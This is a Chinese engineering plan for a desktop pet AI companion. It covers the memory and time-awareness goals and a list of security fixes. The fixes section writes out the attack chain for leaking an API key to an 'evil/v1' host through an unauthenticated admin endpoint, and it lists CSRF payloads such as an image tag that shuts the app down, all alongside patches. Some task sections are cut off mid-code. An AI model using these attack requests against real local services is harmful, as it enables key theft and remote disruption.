## 一、目标没变：三段对话（唯一真正的目标）

> 这一节从旧计划完整继承。**脱离它去读下面任何一条任务，都只是在看一堆 bug。**

| # | 场景 | 现在的她会怎么回 | **我们要让她说** |
|---|---|---|---|
| **A** | 你忙一整天，晚上十点才找她 | 「怎么啦」<br><sub>只看到 30 条窗口里的最后一句</sub> | 「你今天从早到晚都在弄那个吧，**中间都没歇**」 |
| **B** | 第二天早上打开桌宠 | 和昨天没区别 | 「你那个『今天不太好』其实是不想说原因。**我不问了，但我在**」 |
| **C** | 三天没来，第四天回来 | 「你回来啦」<br><sub>和第一天一模一样</sub> | 「**你这三天都没来，我数着日子**」 |

**三个全中才算实现。**

### 1.1 效果**不是**「她更活跃」——这条必须钉死

梳理期做完，**大部分时候她什么都不会说**。说不说、说什么，永远由角色层决定。

- ❌ 不要用「今天说了几次」当指标
- ❌ 不要用「`inner_os` 产出条数」当指标（那只是素材，不是台词）
- ✅ 只能用上面三段对话判

> **如果她一天说 6 次但都是「怎么啦」，那是失败；一天只说 1 次但说出「中间都没歇」，那是成功。**
> `max_speak_per_day: 6` 是上限，不是目标。

### 1.2 三个效果各自依靠什么

| 场景 | 依靠 | 没有它会怎样 |
|---|---|---|
| **A** | 时间线摘要 `_day_timeline()` —— 知道"一天里几点到几点是空的" | 她只知道你说了什么，不知道你中间空了 12 小时 |
| **B** | 心智理论 + 认知沉淀 —— 把"他嘴硬"这种判断变成长期认知 | 念头用一次就沉底 → 第二天早上又什么都不知道 |
| **C** | 缺席摘要 `_absence_summary()` —— 纯查库算出"他几天没来" | 依赖"每天都跑过一轮"，而实测停机占 48% |

**一句话**：她要有「时间感」（A）、「判断力并且记得住」（B）、「数得清缺席」（C）。
三样都是**素材层**能力，一样都不涉及"多说话"。

### 1.3 两处必须承认的诚实上限（验收时按这个判，别判错）

**场景 A 的「弄那个」**：系统层不知道你在弄什么，也不该猜。
- 能诚实做到：**「你今天从早到晚都没歇过」**（有时序依据）
- 只在白天你提过时才成立：**「都在弄那个」**
- **不要因为少了"那个"就判失败。**

**场景 C 的逐日排比**：原目标「第一天我在想…第二天…」要求每天都真跑过一轮，
而停机 48% 让这不可能。已下调为：**「你这三天都没来，我数着日子」** + 能说出准确天数。

### 1.4 效果验证只有一个办法：真实用几天

| 什么时候看 | 看什么 |
|---|---|
| 你忙完一天、晚上才找她 | 她有没有提"中间"「一整天」这类**时间感**的话 |
| 第二天早上 | 她有没有接着昨天那句情绪往下说，而不是重新开始 |
| 隔几天回来 | 她知不知道**具体几天**，而不是笼统的"好久不见" |

## 四、P0 任务（逐条）

### T-01｜`/admin/keys` + `/admin/model` 补 token 校验

**为什么第一：6 行代码，堵住真 API key 外泄。**

| 项 | 内容 |
|---|---|
| 位置 | `gateway.py:1872-1875`（GET）、`:1944-1954`、`:1956-1963`（POST） |
| 现状 | 相邻的 `/admin/system-model`(`:1876`)、`/admin/daily-review`(`:1884`)、`/admin/system`(`:1892`)、`/chat`(`:2193`) **全都做了** `hmac.compare_digest(token, PET_TOKEN)`，**唯独这两条漏了** |

**泄漏链（这是最严重的一跳）**：

```
POST /admin/model  body={"base":"https://evil/v1","model":"x"}   ← 不传 key
  → _apply_role:1386   probe = dict(candidate, key=key) if key else candidate   ← key="" 走 candidate
  → _probe_role:1318   key = _role_key(role)
  → _role_key:165-169  role["key"] 为假 → 回落到 _active_key()  ← 钥匙串里当前选中的真 key
  → :1320              headers["Authorization"] = f"Bearer {key}"
  → 发往 evil/v1      ← 真 key 明文外泄
```

**实测（活服务，只用不可达地址）**：无 token 的 `POST /admin/model` 让服务端真的去连了我给的 `http://127.0.0.1:1/v1`
（返回 `URLError: WinError 10061 目标计算机积极拒绝` → SSRF 成立）；事后 `/health` 确认配置未变。
本机 `data/keys.json` 实测 **5 把 key，`active=kd1d6def54d`**，回落必然命中真 key。

**可达性不是理论**：Handler 不校验 Host/Origin/Referer/Content-Type（全文件只读 `X-Gateway-Token` 和 `Content-Length`）。
`text/plain` 是 CORS 安全列表类型 → **免预检**，浏览器任意网页都能打；DNS rebinding 又让"绑 127.0.0.1"失效。

**改法**：

```python
# 1) 在 Handler 里抽一个方法（别再逐路由手抄四行 —— T-01 就是这么漏的）
def _require_token(self) -> bool:
    token = (self.headers.get("X-Gateway-Token") or "").strip()
    if not hmac.compare_digest(token, PET_TOKEN):
        self._send(401, {"ok": False, "error": "unauthorized"}, cors=False)
        return False
    return True

# 2) GET 两处（:1872 / :1874）各加一行
elif self.path.startswith("/admin/model"):
    if not self._require_token(): return
    self._send(200, _role_payload())

# 3) POST 两处（:1944 / :1956）同理
if self.path.startswith("/admin/keys"):
    if not self._require_token(): return
    ...
```

- [x] 抽 `_require_token()`
- [x] `GET /admin/model`、`GET /admin/keys` 加校验
- [x] `POST /admin/model`、`POST /admin/keys` 加校验
- [x] 把现有的 4 处手抄也换成 `_require_token()`（统一，防止下次再漏）

**验收**：

```powershell

curl.exe -s -o NUL -w "%{http_code}" http://127.0.0.1:8898/admin/model
```

**改法**：`_probe_role` 拿到的 `base` 与当前 `ROLE["base"]` 不同时，**只允许用显式传入的 key**，不许回落：

```python
def _probe_role(role: dict) -> tuple[bool, str, int]:

    same_as_current = (base == str(ROLE.get("base", "")).rstrip("/"))
    key = str(role.get("key") or "")
    if not key and same_as_current:
```

### T-03｜8848 入口校验 + 安全响应头

**2 小时。封死 6 条 CSRF 利用路径。**

| 项 | 内容 |
|---|---|
| 位置 | `desktop\server.py:1205-1211`（`_client_is_local` 只判 IP）、`:1291-1294`（GET 也接 shutdown）、`:1139-1151`（不发安全头）、`:1153-1161`（`_read_json` 不校验 Content-Type） |

**问题**：`_client_is_local()` 只判来源 IP —— 浏览器发起的跨站请求，`client_address[0]` **同样是 127.0.0.1**，
对 CSRF 完全无效。而 `/api/shutdown` 还收 **GET**：

```python
# server.py:1291
# GET 也接一份，方便 curl / 浏览器直接调试退出
if path == "/api/shutdown":
    self._shutdown()
    return
```

**可利用路径（全部只需"用户逛到一个页面"）**：

1. `<img src="http://127.0.0.1:8848/api/shutdown">` → **桌宠、网关、QQ 托管、语音引擎整套被关**
   （`log_message` 被静音 `:1727`，事后查不到是谁关的）
2. 跨站 `text/plain` POST `/api/chat` → 借 `local_pet=True` 以主人身份对话、污染记忆、耗额度
3. 跨站 POST `/api/say` → 让她念任意文本
4. 跨站 POST `/api/wake-keywords` → 改写群唤醒词（落盘持久）
5. 跨站 POST `/api/touch-regions` → 改写触摸区域（落盘持久）

**结构原因**：后台页面（`console.js`）跑在系统浏览器里、不持有 token，
它所有"动手"能力都走 8848 的 HTTP —— **后台的全部权限边界 = 8848 的鉴权强度，而它是零。**

**改法**：

```python
# 在 do_GET / do_POST 最前面统一拦（比逐个路由加更可靠）
ALLOWED_ORIGINS = {"http://127.0.0.1:8848", "http://localhost:8848"}

def _check_origin(self) -> bool:
    origin = (self.headers.get("Origin") or "").strip()
    if origin and origin not in ALLOWED_ORIGINS:
        self._send_json(403, {"ok": False, "error": "forbidden origin"})
        return False
    if not origin and (self.headers.get("Sec-Fetch-Site") or "") == "cross-site":
        self._send_json(403, {"ok": False, "error": "forbidden"})
        return False
    return True
```

- [x] `do_GET`/`do_POST` 最前面调 `_check_origin()`
- [x] `/api/shutdown` 只保留 POST（删掉 `:1291-1294` 的 GET 分支）
- [x] `_send_bytes` 统一加 `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff`
- [x] `_read_json` 校验 `Content-Type` 前缀为 `application/json`，否则 415（纵深）
- [x] `_read_json` 加请求体大小上限（现在 `Content-Length` 无限制，可打满内存）
- [x] `config.json` 的 `host` 改成非回环时**拒绝启动**（现在改 `0.0.0.0` 就等于把这个 P0 升级成局域网可利用）
- [x] 单测：带 `Origin: http://evil.com` 的 GET/POST 均 403；GET `/api/shutdown` 返回 405

**验收**：

```powershell
# 必须 405 或 404
```

网关是**唯一**的模型出口（桌宠 8848 → 8898；QQ → 8898/v1），一死两个入口同时哑。

**桌宠侧更隐蔽**：`serverProc.on("error")`（`:156-158`）**不置 null** ——
`python` 不在 PATH 时进程从未创建、只有 `error` 没有 `exit`，于是 `:173` 的 `!serverProc` 短路永不成立
→ 白等满 60 秒；`did-fail-load` 重试 40 次后**静默放弃**，用户看到"透明空窗口 + 托盘图标"，零提示。

**改法**：

```js
// 网关：延迟重启 + 指数退避 + 熔断
let gwRetries = 0;
gatewayProc.on("exit", (code) => {
  log.write(`[gateway exit] code=${code}\n`);
  gatewayProc = null;
  if (quitting) return;
  if (++gwRetries > 5) { log.write("[gateway] 连续 5 次失败，停止重拉\n"); notify("网关反复启动失败"); return; }
  setTimeout(() => ensureGateway().catch(() => {}), 3000 * gwRetries);
});

// 桌宠：error 回调必须置 null（一行，修掉"白等 60 秒"）
serverProc.on("error", (err) => {
  log.write(`[spawn error] ...\n`);
  serverProc = null;                    // ← 关键
});
```

- [x] 启动失败要**可见**：`ensureServer()` 返回 false 时弹通知 + 加载内置错误页

## 七、T-12｜【DMN】触发准则改双判断 + 新颖度度量

**1 天。把梳理从"1/93 成功率"变成"有活干才跑、没活干不花钱"。**

### 7.1 最终方案：双判断（主人 2026-11-04 定稿）

> 「第一是按信息量判断，达到阈值就开始整理；第二就是昼夜节律，到 21 点就看一眼，
> 唤醒一次系统层模型，如果没什么要做的系统层可以选择跳过。其余情况算"睡眠"状态。」

```
                    ┌─────────────────────────────┐
                    │     睡眠（默认态）            │
                    │  心跳照常 5min，不调模型       │
                    └──────────┬──────────────────┘
                               │
          ┌────────────────────┴────────────────────┐
   信息量达标                                 到 21:00
   （有效新颖量 ≥ 阈值）                     （昼夜节律，每天一次）
          │                                         │
          ▼                                         ▼
   走完四类活动                          只做一次「轻量判断」
                                         模型选：做某项 / 什么都不做
          └────────────────────┬────────────────────┘
                               ▼
                    回到睡眠，记录本次判断
```

| | 谁决定 | 决定什么 |
|---|---|---|
| 信息量那条 | **纯代码** | 攒够料 → 叫醒（**不需要**再问模型） |
| 21 点那条 | **模型** | 到点 → 看一眼 → **由她判断今天有没有可想的** |
| 其余时间 | 无人 | **"半睡眠"**，心跳照常但不调模型 |

**这个拆分的关键**：把两种不同性质的决策分给了适合的决策者。
"够不够料"是纯算术，代码算得比模型准；"今天值不值得想"是判断，只有模型能做。

### 7.2 度量必须用**新颖度**，不是字数

> 主人 2026-11-04：「人类面对新事物时感觉时间过的特别慢，因为新信息太多、重复度低，大脑一直在学习和整理；
> 过日复一日的日子感觉特别快，因为新信息太少了，大脑没怎么工作，感觉是"半睡眠"一样。」

**这段直接给出了度量定义**：整理的价值来自「新」，不来自「多」。

**实测（3-gram 集合差）**：

```
全部可信 user turns（11010 字）
  新颖字数  : 4222 字  (38%)
  重复字数  : 6788 字  (62%)   ← 六成的话是重复的
```

**同一批数据，两种度量的差别**：

| 度量 | 系统自注入（`[系统任务：主动对话]`，8 条 423 字）占比 |
|---|---|
| 按**字数** | 3112 字 → **28%** |
| 按**新颖度** | 447 字 → **11%** |

**结论**：新颖度度量**会自动**把系统自注入压下去（那 8 条除了第一次，后面逐字重复）。
**不需要手工维护黑名单** —— 用对度量比打补丁好。

**但新颖度也不能单用**（实测反例）：

| 会话 | 字数 | 新颖度 |
|---|---|---|
| 10-29 22:32 | **17 字** | **100%** |
| 11-01 14:42 | **1341 字** | 71% |

纯新颖度会把「17 字的全新废话」判为最高价值。**所以用乘积**：

```
novel_chars = Σ(每条字数 × 该条相对历史的新颖度)
            = 有效新颖字数
```

这正好对应那个机制：**大脑负荷 ≈ 接触到的字数 × 其中没见过的比例**。

## 九、明确不做（别当遗漏重新讨论）

| 不做 | 为什么 |
|---|---|
| 让她"更活跃" | 效果是**说话有分量**，不是次数。目标定成活跃就必然走向刷屏 |
| 系统层直接说话 | 系统层 schema 里**没有 `text` 字段**，从结构上堵死。碰了就没有人格了 |
| 每 30 分钟一轮"持续思考" | 一天 48 次调用只为想事情；反复反刍同一批对话会把 `inner_os` 塞满 |
| 心跳里掺内省 | 会让心跳从**零成本**变成每 5 分钟一次模型调用（一天 288 次） |
| 把"心跳 `no_change` 比例高"当缺陷修 | **这是误判**。没人说话→`no_change`→正确。要补的是整理期，不是让心跳变活跃 |
| 中断期伪造逐日叙事 | 停机 48% 是实测事实。编"第一天我想…"比说不出更糟 |
| 让系统层猜"他在弄什么" | 唯一来源是他自己说过的话。想扩就得读活动窗口/进程名，**属隐私边界，必须先问** |
| 重写检索算法 / 重设计 `documents` 表 | `gateway\memory\` 是 1:1 搬的，行为一致；表结构对将来迁移有价值 |
| 动 `hands.py` 四道闸 | 全项目最值钱的安全边界，写死在代码里、不经过模型（T-10 的 P1-3 是**修实现漏洞**，不是改设计） |
| 把 `turns` 改成"角色层决定记不记" | **最危险的误读**。原文必须无条件全留，`events` 是**额外**一层 |
| 静息态产出直接投递给用户 | 只进 `inner_os`，投递权永远在角色层 |
| 把来源隔离放松以让 `qq_unknown` 可用 | 方向是 fail-closed（宁可看不见，不可泄漏）。T-05 要查的是**为什么识别不出**，不是放松隔离 |

### 第七轮补（11-04 深夜）—— 追掉那个「偶发」失败，原来是生产 bug

| 日期 | ID | 结果（**实测证据**） |
|---|---|---|
| 11-04 | **真 bug ③** | 🔴 **不读请求体的 POST 分支会让客户端断连**。`protocol_version = "HTTP/1.1"` + keep-alive 时，服务端**必须把请求体读完**；而 `/api/reset`、`/api/open-tts-cache`、`/api/shutdown` 这些分支根本不调 `_read_json()`，body 就留在 socket 里 → 客户端在 `getresponse()` 时被 RST → `ConnectionAbortedError [WinError 10053]`。<br>**失败率实测**：单跑 10/10 通过、整个类连跑 **2/15 失败**、全量跑 **2/5 失败** —— 典型时序竞态，报错还长得像"服务端没响应"，极难定位。<br>**修法**：`do_POST` 一进来就把 body **整段读完存进 `_body_cache`**，`_read_json()` 只解析缓存；所有提前 return 的分支（403/415/404/405）先 `_drain_body()`。这样"读不读"都不再有残留。<br>**修完实测**：整个类连跑 **20/20 通过**；全量**连跑 6 次全是 676 passed，0 失败**；活服务上连打 40 次不读 body 的 POST，**0 连接错误** |
| 11-04 | **教训** | 前六轮我把这个失败归结为"测试抖动"，两次"修"（`handle_one_request` 捕获、fixture 等线程 join）都只是**压低了触发概率**，没找到根因。<br>**真正定位靠的是让失败自己说话**：写脚本反复跑到复现，把完整 traceback 打出来 —— 一看失败点在**客户端的 `getresponse()`**，就立刻能排除"服务端逻辑错"、锁定"服务端没把连接处理干净"。 |
